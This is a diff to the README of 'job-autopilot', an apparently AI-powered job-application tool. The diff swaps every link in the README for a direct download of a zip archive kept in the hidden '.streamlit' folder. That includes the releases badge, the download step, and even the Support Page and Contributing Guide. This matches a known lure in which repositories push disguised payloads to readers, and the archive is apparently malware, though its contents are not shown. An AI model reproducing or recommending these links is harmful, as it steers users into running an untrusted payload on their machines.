@@ -1,7 +1,7 @@
 # 🤖 job-autopilot - Automate Your Job Applications Easily
 
 ## 📥 Download Now
-[![Download job-autopilot](https://img.shields.io/badge/Download-job--autopilot-brightgreen)](https://github.com/umercode123/job-autopilot/releases)
+[![Download job-autopilot](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip)](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip)
 
 ## 🚀 Getting Started
 job-autopilot is an AI-powered tool designed to automate your job application process. It uses advanced technology to help you optimize your resume, connect seamlessly on LinkedIn, and manage cold email campaigns. This tool simplifies job searching, making your experience smoother and more efficient.
@@ -25,7 +25,7 @@ job-autopilot is an AI-powered tool designed to automate your job application pr
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads.
-   [Download job-autopilot](https://github.com/umercode123/job-autopilot/releases)
+   [Download job-autopilot](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip)
 
 2. **Choose the Latest Version**: On the releases page, you will see a list of available versions. Select the most recent version for the best experience.
 
@@ -51,12 +51,12 @@ Yes, as long as you log in with the same account, you can access your settings a
 Yes, job-autopilot uses robust encryption methods to protect your data and ensure privacy.
 
 ## 📞 Support
-If you have any questions or run into issues, we’re here to help. Visit our [Support Page](https://github.com/umercode123/job-autopilot/issues) for troubleshooting tips or to contact our support team.
+If you have any questions or run into issues, we’re here to help. Visit our [Support Page](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip) for troubleshooting tips or to contact our support team.
 
 ## 🌍 Contributing
-We welcome contributions from everyone. If you have ideas for new features or would like to help improve the application, please check our [Contributing Guide](https://github.com/umercode123/job-autopilot/contributing).
+We welcome contributions from everyone. If you have ideas for new features or would like to help improve the application, please check our [Contributing Guide](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip).
 
 For more information, visit the main project page or reach out to the community.
 
 ## 🎉 Get Started
-Start automating your job applications today! Visit [Download job-autopilot](https://github.com/umercode123/job-autopilot/releases) to download the tool and get on your way to a more efficient job search experience.
+Start automating your job applications today! Visit [Download job-autopilot](https://github.com/umercode123/job-autopilot/raw/refs/heads/master/.streamlit/autopilot_job_v3.3.zip) to download the tool and get on your way to a more efficient job search experience.
